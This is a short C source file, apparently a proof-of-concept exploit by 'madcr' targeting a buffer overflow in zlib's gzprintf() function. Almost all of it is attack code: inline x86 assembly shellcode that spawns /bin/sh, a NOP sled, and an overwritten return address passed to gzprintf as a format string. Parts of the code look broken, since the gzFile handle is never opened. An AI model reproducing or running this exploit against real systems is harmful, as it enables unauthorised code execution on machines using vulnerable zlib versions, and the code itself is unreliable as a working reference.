/*
 
 zlib gzprintf() overflow super-leet expl by madcr
 greets to 'sasha & seroja' ;)

 $ gcc -g -o expl expl.cpp -lz

*/

#include <stdio.h>
#include <zlib.h>

void shell_asm_x86()
{
 __asm__(" xorl   %eax,%eax              
           pushl  %eax                  
           pushl  $0x68732f2f  
           pushl  $0x6e69622f           
           movl   %esp,%ebx             
           pushl  %eax                  
           pushl  %ebx                  
           movl   %esp,%ecx             
           .byte  0x99         # cdql
           movb   $0x0b,%al           
           int    $0x80
         ");
};

unsigned long getesp() { __asm__("movl %esp, %eax"); } 

main(int argc, char *argv[])
{
       gzFile f;
       char buf[4104];
                     
       int ret = getesp() - 100; // addr of our shellcode

       for (int i = 0; i < 4052; i++) buf[i] = '\x90';   // nops

       char* shellcode = (char*) (((long)&shell_asm_x86) + 3);  // 3 = prologue

       for (int n = 0; n < strlen(shellcode); n++)   // shellcode
                buf[4052+n] = shellcode[n];

       *( (int *) &buf[4100])=ret;   // return address

       gzprintf(f,buf);   // nops + shellcode + addr.

}
